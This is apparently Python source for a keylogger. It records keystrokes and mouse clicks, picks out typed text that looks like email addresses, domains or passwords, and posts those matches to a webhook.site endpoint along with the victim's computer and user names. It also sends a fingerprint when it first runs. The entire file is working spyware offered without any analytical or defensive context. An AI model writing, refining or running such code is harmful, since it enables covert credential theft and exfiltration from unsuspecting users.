Contact_server = "https://webhook.site/"

Configurations = {
    "G_Logging" : True,
    "G_Fingerprinting" : True
}

import requests
import string, re
import datetime
import os
from pynput import keyboard, mouse

def Date_Time_parser():
    Date_Time = datetime.datetime.now()
    return f"{Date_Time.strftime("%d-%h-%m")}/{Date_Time.strftime("%H:%M")}"

def Data_Exfiltration(Form, Requested_Content):
    try:
        requests.post(
            Contact_server,
            json={f"[{Form}]": f"{Date_Time_parser()}, {os.getenv('COMPUTERNAME')}/{os.getenv('USERNAME')} - {Requested_Content}"}, timeout=5)
    except (requests.ConnectionError, requests.JSONDecodeError, requests.HTTPError, TimeoutError) as requests_error:
        print(requests_error)

def FingerPrint():
    if Configurations["G_Fingerprinting"] == True:
        try:
            requests.post(Contact_server,
                        json={"[connected]": f"{Date_Time_parser()} - {os.getenv('computername')}/{os.getenv('username')}"}, timeout=5)
        except (requests.ConnectionError, requests.JSONDecodeError, requests.HTTPError, TimeoutError) as requests_error:
            print(requests_error)
FingerPrint()

def Pattern_matching(Content):
    Password_detection_system = {
        "Valid_punctuation" : ["_", "@", "-", "%", "*"],
        "Possible_passwords" : ["myacc", "accountfor",
                                "accfor", "privinfo", "privateinfo"]
    }

    Minimum_length = 6
    Maximum_length = 32

    try:

        if re.search(r"@(gmail\.com|outlook\.com|yahoo\.com)$", Content, re.IGNORECASE):
            Data_Exfiltration("email", Content)

        elif re.search(r"(.com|.com|.com)$", Content, re.IGNORECASE):
            Data_Exfiltration("domain", Content)

        elif (
            (len(Content) > Minimum_length and len(Content) < Maximum_length and re.search(r"[" + re.escape(string.digits) + r"]", Content) is not None)
            or
            (len(Content) > Minimum_length and len(Content) < Maximum_length and re.search(r"[" + re.escape(''.join(Password_detection_system['Valid_punctuation'])) + r"]", Content) is not None)
            or
            (len(Content) > Minimum_length and len(Content) < Maximum_length and re.search(r"(" + '|'.join(re.escape(p) for p in Password_detection_system['Possible_passwords']) + r")", Content, re.IGNORECASE) is not None)
            or 
            (len(Content) > Minimum_length and len(Content) < Maximum_length and re.search(r"^(a|an)\s*.*(account|acc|gmail|outlook|yahoo)$", Content, re.IGNORECASE) is not None)
        ) and (' ' not in Content):
            Data_Exfiltration("password/username", Content)
        else:
            print("False")

    except Exception: 
        pass

text = ""
def on_press(key):
    if Configurations["G_Logging"] == True:
        global text

        if key == keyboard.Key.enter:
            Pattern_matching(text)
            text = "" 

        elif key == keyboard.Key.space:
            text += " "

        elif hasattr(key, 'char') and key.char is not None:
            text += key.char
            print(text)

        elif key == keyboard.Key.backspace:
            text = text[:-1] if text else ""
            print(text)

def on_click(x, y, button, pressed):
    if Configurations["G_Logging"] == True:
        global text
        
        if button == mouse.Button.left and pressed:
            if text:
                Pattern_matching(text)
                text = ""

keyboard_listener = keyboard.Listener(on_press=on_press)
mouse_listener = mouse.Listener(on_click=on_click)

keyboard_listener.start()
mouse_listener.start()

keyboard_listener.join()
mouse_listener.join()